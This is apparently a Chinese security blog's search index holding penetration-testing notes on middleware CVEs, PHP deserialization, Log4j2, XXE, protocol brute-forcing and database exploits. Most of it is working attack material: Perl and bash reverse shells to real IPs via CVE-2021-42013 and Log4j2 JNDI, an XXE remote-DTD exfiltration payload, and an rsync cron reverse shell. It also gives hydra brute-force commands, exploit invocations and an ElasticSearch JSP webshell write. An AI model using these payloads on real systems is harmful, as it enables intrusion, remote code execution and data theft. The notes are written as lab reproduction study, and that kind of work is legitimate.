<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</title>
      <link href="/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/"/>
      <url>/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx"><a href="#中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx" class="headerlink" title="中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"></a>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</h3><hr><p>中间件及框架列表：</p><pre><code>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</code></pre><h4 id="一-中间件-IIS-短文件-amp-解析-amp-蓝屏等"><a href="#一-中间件-IIS-短文件-amp-解析-amp-蓝屏等" class="headerlink" title="一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:"></a>一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:</h4><p>1、短文件：信息收集</p><p>2、文件解析：还有点用</p><p>3、HTTP.SYS：蓝屏崩溃</p><p>4、CVE-2017-7269 条件过老</p><h4 id="二-中间件-Nginx-文件解析-amp-命令执行等"><a href="#二-中间件-Nginx-文件解析-amp-命令执行等" class="headerlink" title="二.中间件-Nginx-文件解析&amp;命令执行等:"></a>二.中间件-Nginx-文件解析&amp;命令执行等:</h4><p>1、后缀解析 文件名解析</p><p>配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><p>2、cve_2021_23017 无EXP</p><p>3、cve_2017_7529 意义不大</p><h4 id="三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等"><a href="#三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等" class="headerlink" title="三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:"></a>三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:</h4><p>Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p><p>1.cve_2021_42013  RCE:</p><pre><code>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh echo;perl -e 'use Socket;$i="47.94.236.117";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>2、cve_2021_41773 目录穿越</p><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><pre><code>Burp：/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd</code></pre><p>3、cve-2017-15715  文件解析</p><p>Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>4、cve_2017_9798 价值不高</p><p>5、cve_2018_11759 价值不高</p><p>6、cve_2021_37580 插件问题</p><h4 id="四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等"><a href="#四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等" class="headerlink" title="四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:"></a>四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:</h4><p>1、弱口令猜解</p><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p><p>生成马：xx.jsp 然后压缩成xx.zip 然后改后缀名为xx.war 进行上传</p><p>2、CVE-2017-12615 文件上传</p><p>当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p><p>影响版本:Apache Tomcat 7.0.0 - 7.0.79</p><p>PUT /1.jsp/ HTTP/1.1</p><p>shell代码</p><p>3、cve_2020_1938 文件包含</p><p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p><p>漏洞影响的产品版本包括：</p><p>Tomcat 6.*</p><p>Tomcat 7.* &lt; 7.0.100</p><p>Tomcat 8.* &lt; 8.5.51</p><p>Tomcat 9.* &lt; 9.0.31</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><pre><code>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF/web.xml</code></pre><p>4、cve_2020_11996 拒绝服务</p><p>危害过大，权限无关，意义不大</p><p>5、cve_2020_9484 反序列化</p><p>利用条件太苛刻，意义不大</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
      <link href="/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/"/>
      <url>/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="PHP反序列化-amp-POP链构造-amp-魔术方法-amp-原生类"><a href="#PHP反序列化-amp-POP链构造-amp-魔术方法-amp-原生类" class="headerlink" title="PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"></a>PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</h3><hr><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     //将一个对象转换成一个字符串</p><p>unserialize()   //将字符串还原成一个对象</p><h4 id="PHP反序列化漏洞："><a href="#PHP反序列化漏洞：" class="headerlink" title="PHP反序列化漏洞："></a>PHP反序列化漏洞：</h4><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h4 id="php中魔术方法："><a href="#php中魔术方法：" class="headerlink" title="php中魔术方法："></a>php中魔术方法：</h4><pre><code>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：__construct(): //构造函数，当对象new的时候会自动调用__destruct()：//析构函数当对象被销毁时会被自动调用__wakeup(): //unserialize()时会被自动调用__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用__call(): //在对象上下文中调用不可访问的方法时触发__callStatci(): //在静态上下文中调用不可访问的方法时触发__get(): //用于从不可访问的属性读取数据__set(): //用于将数据写入不可访问的属性__isset(): //在不可访问的属性上调用isset()或empty()触发__unset(): //在不可访问的属性上使用unset()时触发__toString(): //把类当作字符串使用时触发__sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</code></pre><pre><code>O：4：”info“：2：{s：5：“namea”；i：1：“9”；}O：object 代表数组，i代表数组4：对象长度info：对象名称2：该对象中变量的个数s:变量数据类型，s代表string,i代表int4:变量名长度namea:变量名</code></pre><p>上述是反序列化出来的格式</p><h4 id="PHP原生类-获取-amp-利用-amp-配合其他："><a href="#PHP原生类-获取-amp-利用-amp-配合其他：" class="headerlink" title="PHP原生类-获取&amp;利用&amp;配合其他："></a>PHP原生类-获取&amp;利用&amp;配合其他：</h4><p>内置的一个组件</p><pre><code>参考：https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception</code></pre><p>生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll</p><p>脚本：</p><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><pre><code>&lt;?php$classes = get_declared_classes();foreach ($classes as $class) {    $methods = get_class_methods($class);    foreach ($methods as $method) {        if (in_array($method, array(            '__destruct',            '__toString',            '__wakeup',            '__call',            '__callStatic',            '__get',            '__set',            '__isset',            '__unset',            '__invoke',            '__set_state'        ))) {            print $class . '::' . $method . "\n";        }    }} </code></pre><h3 id="PHP反序列化-amp-原生类-amp-漏洞绕过-amp-公私有属性"><a href="#PHP反序列化-amp-原生类-amp-漏洞绕过-amp-公私有属性" class="headerlink" title="PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"></a>PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</h3><hr><h4 id="对象变量属性："><a href="#对象变量属性：" class="headerlink" title="对象变量属性："></a>对象变量属性：</h4><p>public(公共的):在本类内部、外部类、子类都可以访问</p><p>protect(受保护的):只有本类或子类或父类中可以访问</p><p>private(私人的):只有本类内部可以使用</p><p>序列化数据显示：</p><p>private属性序列化的时候格式是%00类名%00成员名</p><p>protect属性序列化的时候格式是%00*%00成员名</p><pre><code>&lt;?phpheader("Content-type: text/html; charset=utf-8");/*public private protected说明class test{​    public $name="xiaodi";​    private $age="29";​    protected $sex="man";}$a=new test();$a=serialize($a);print_r($a);*/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞复现</title>
      <link href="/2022/04/07/log4j2-lou-dong-fu-xian/"/>
      <url>/2022/04/07/log4j2-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><p> 最近的特大漏洞log4j2的出现，也是掀起了安全圈的一个风暴呀，自己也尝试着来复现一下吧，毕竟慢慢成长嘛。</p><p>漏洞描述Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞影响版本Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>下面直接开始复现</p><p>现在虚拟机上面拉个Java环境，这样方便嘛</p><p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203247.png"></p><p>然后docker images 观看是那个镜像文件，把它跑起来</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203257.png"></p><p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203313.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203320.png"></p><p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机的ip</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203336.png"></p><p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203344.png"></p><p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203356.png"></p><p>现在就到了最刺激的一步了，直接来弹shell吧。。</p><p>首先我们要启动一个idap服务，那就去github（JNDI-Injection-Exploit）上面下载吧。下载完成后在本地执行命令</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}”-A “xxxxx(执行这个命令的本机ip)”</p><p>当然我这里是在自己的服务器上执行的，都可以看感觉吧 哈哈哈</p><p>先把这个文件提到我的服务器上面去</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203404.png"></p><p>然后直接执行命令哇，但是这里要注意写进去的shell命令要编码喔，否则不行。</p><p>bash -i &gt;&amp; /dev/tcp/120.25.208.59/6363 0&gt;&amp;1 直接反弹到自己的服务区上面去。在<a href="https://www.jackson-t.ca/runtime-exec-payloads.html%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA">https://www.jackson-t.ca/runtime-exec-payloads.html编码后为</a></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjUuMjA4LjU5LzYzNjMgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p>然后在服务器上面执行那个命令</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203419.png"></p><p>然后将这个放到bp上面执行，在自己的服务起上面监听6363端口</p><p>payload=${jndi:ldap://baidu.ehlf5h.ceye.io}</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203427.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203434.png"></p><p>然后就直接拿到shell,完成复现。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203441.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</title>
      <link href="/2022/04/05/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/"/>
      <url>/2022/04/05/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计"><a href="#XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计" class="headerlink" title="XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a><strong>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</strong></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p>客户端：xml发送数据</p><p>服务端：xml解析数据</p><p>利用xml写一个带有文件读取的代码尝试发送，类似文件读取功能实现</p><p>无回显：要利用带外测试（利用dnslog来做测试！） </p><p>实体引用：引用远程的evil2.dtd文件</p><h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><pre><code>&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;​    %file;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</code></pre><p>evil2.dtd ：该文件读取d:e.txt的内容</p><pre><code>&lt;!ENTITY send SYSTEM "file:///d:/e.txt"&gt;##### 2.解决数据不回显的问题</code></pre><pre><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "file:///d:/e.txt"&gt;&lt;!ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'&gt;"&gt;</code></pre><h5 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h5><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>更改请求数据格式：Content-Type</p><h5 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h5><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><p>-方案1-禁用外部实体</p><p>PHP:</p><p>libxml_disable_entity_loader(true);</p><p>JAVA:</p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p>Python：</p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><p>-方案2-过滤用户提交的XML数据</p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
      <link href="/2022/03/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/"/>
      <url>/2022/03/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h2 id="应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解"><a href="#应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解" class="headerlink" title="应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"></a>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</h2><h4 id="用hydra爆破（弱口令爆破）"><a href="#用hydra爆破（弱口令爆破）" class="headerlink" title="用hydra爆破（弱口令爆破）"></a>用hydra爆破（弱口令爆破）</h4><p>FTP（端口：21）：文本传输协议  （用户名随机）</p><p>RDP（端口：3389）,SSH（端口：22）：windows,linux上的远程传输协议</p><p>RDP用户名（一般是administrator） SSH用户名(一般是root)</p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>用hydra爆破</p><pre><code>-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。</code></pre><pre><code>hydra -L test -P 10top1K.txt 目标IP ftp -Vhydra -l root -P 10top1K.txt 目标IP ssh -Vhydra -l administrator -P 10top1K.txt 目标IP rdp -V</code></pre><p>L： 指定用户名字典   l：指定用户名  P：指定密码字典</p><h4 id="Rsync文件备份（未授权访问）"><a href="#Rsync文件备份（未授权访问）" class="headerlink" title="Rsync文件备份（未授权访问）"></a>Rsync文件备份（未授权访问）</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><pre><code>判断：rsync rsync://目标IP利用：-读取文件：rsync rsync://目标IP/src/-下载文件：rsync rsync://目标IP/src/etc/passwd ./-上传文件：rsync -av passwd rsync://目标IP/src/tmp/passwd反弹shell：1、获取信息：rsync rsync://目标IP/src/etc/crontab /root/cron.txt2.创建文件 touch shell \#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/本地IP/5566 0&gt;&amp;1chmod +x shell        3、上传文件 rsync -av shell rsync://目标IP/src/etc/cron.hourly 4、等待接受反弹</code></pre><p>利用msf:auxiliary/scanner/rsync/modules_list</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><pre><code>https://github.com/t0kx/exploit-CVE-2015-3306python exploit.py --host 123.58.236.76 --port 24967 --path "/var/www/html/"http://123.58.236.76:19758/backdoor.php?cmd=id</code></pre><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><pre><code>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778CVE-2014-0160 版本很少cve_2020_15778 价值不高CVE-2018-15473-用户名枚举https://github.com/Rhynorater/CVE-2018-15473-Exploitpip3 install -r requirements.txtpip3 install paramiko==2.4.1python sshUsernameEnumExploit.py --port 32013 --userList exampleInput.txt 123.58.236.76</code></pre><h4 id="libssh-身份验证绕过（CVE-2018-10933）"><a href="#libssh-身份验证绕过（CVE-2018-10933）" class="headerlink" title="libssh 身份验证绕过（CVE-2018-10933）"></a>libssh 身份验证绕过（CVE-2018-10933）</h4><pre><code>https://www.seebug.org/vuldb/ssvid-97614python libssh.py 123.58.236.76 55190 "id"</code></pre>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务攻防——数据库类型安全</title>
      <link href="/2022/03/04/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/"/>
      <url>/2022/03/04/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="服务攻防——数据库类型安全"><a href="#服务攻防——数据库类型安全" class="headerlink" title="服务攻防——数据库类型安全"></a>服务攻防——数据库类型安全</h4><p>1.influxdb-未授权访问-jwt验证</p><p>2.H2database-未授权访问-配置不当</p><p>3.CouchDB-权限绕过配合RCE-漏洞</p><p>4.ElasticSearch-文件写入&amp;RCE-漏洞</p><h5 id="1-influxdb-未授权访问-jwt验证"><a href="#1-influxdb-未授权访问-jwt验证" class="headerlink" title="1.influxdb-未授权访问-jwt验证"></a>1.influxdb-未授权访问-jwt验证</h5><p> 该数据库的默认端口：8086  8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。 借助jwt.io来生成jwt token</p><h5 id="2-H2-database-未授权访问-配置不当"><a href="#2-H2-database-未授权访问-配置不当" class="headerlink" title="2.H2 database-未授权访问-配置不当"></a>2.H2 database-未授权访问-配置不当</h5><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><pre><code>spring.h2.console.enabled=true spring.h2.console.settings.web-allow-others=true </code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><h5 id="3-CouchDB-权限绕过配合RCE-漏洞"><a href="#3-CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="3.CouchDB-权限绕过配合RCE-漏洞"></a>3.CouchDB-权限绕过配合RCE-漏洞</h5><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>CouchDB-权限绕过-CVE-2017-12635</p><h5 id="4-ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#4-ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="4.ElasticSearch-文件写入&amp;RCE-漏洞"></a>4.ElasticSearch-文件写入&amp;RCE-漏洞</h5><p>Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/</p><pre><code>curl -XPOST http://123.58.236.76:31556/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'curl -XPUT 'http://123.58.236.76:31556/_snapshot/yz.jsp' -d '{​     "type": "fs",​     "settings": {​          "location": "/usr/local/tomcat/webapps/wwwroot/",​          "compress": false​     }}'curl -XPUT "http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp" -d '{​     "indices": "yz.jsp",​     "ignore_unavailable": "true",​     "include_global_state": false}'</code></pre><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><pre><code>http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=successhttp://123.58.236.76:31557/wwwroot/test.jsp</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
